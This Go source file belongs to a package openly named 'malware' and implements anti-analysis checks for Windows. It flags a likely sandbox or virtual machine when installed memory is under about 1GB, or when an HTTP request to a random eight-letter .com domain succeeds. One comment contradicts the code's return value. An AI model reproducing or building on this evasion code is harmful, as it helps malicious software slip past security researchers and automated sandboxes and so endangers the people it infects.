package malware

import (
	"net/http"
	"syscall"
	"unsafe"
)

var (
	k32 = syscall.NewLazyDLL("kernel32.dll")
)

func VmCheck() bool {
	if checkRam() {
		return true
	}
	if checkUrl() {
		return true
	}
	return false
}

// checkRam checks if the system has less than 1GB of ram
func checkRam() bool {
	var mem uint64
	k32.NewProc("GetPhysicallyInstalledSystemMemory").Call(uintptr(unsafe.Pointer(&mem)))
	// if ram is less than 1GB, return false
	return mem < 1000000
}

// checkUrl checks if a random url exist
func checkUrl() bool {
	n := NewName(8)
	url := "http://" + n + ".com"
	_, err := http.Get(url)
	if err == nil {
		// if the url exists, return true
		return true
	}
	return false
}
